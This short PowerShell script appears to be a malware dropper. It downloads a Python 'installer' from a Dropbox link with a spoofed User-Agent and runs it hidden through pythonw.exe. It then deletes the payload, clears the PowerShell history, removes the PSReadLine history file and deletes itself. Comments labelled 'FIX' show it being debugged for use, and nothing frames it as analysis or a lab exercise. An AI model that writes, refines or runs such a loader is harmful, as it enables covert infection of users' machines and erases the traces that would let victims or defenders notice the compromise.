$url = "https://dl.dropboxusercontent.com/scl/fi/tu8adsaq78omymdmv28k1/installer.py?rlkey=2ktj16qecla9xnkmgmtse5rkl&dl=1"
$name = [System.IO.Path]::GetRandomFileName() -replace "\..*",""
$temp = "$env:TEMP\$name.tmp"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$wc.DownloadFile($url, $temp)

# FIX 1: Add quotes around the argument
Start-Process -WindowStyle Hidden -FilePath "pythonw.exe" -ArgumentList "`"$temp`""

Start-Sleep -Seconds 5
Remove-Item $temp -Force -ErrorAction SilentlyContinue
Clear-History
$hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Remove-Item $hist -Force -ErrorAction SilentlyContinue

# FIX 2: Only delete if running as a script file
if ($MyInvocation.MyCommand.Path) {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}
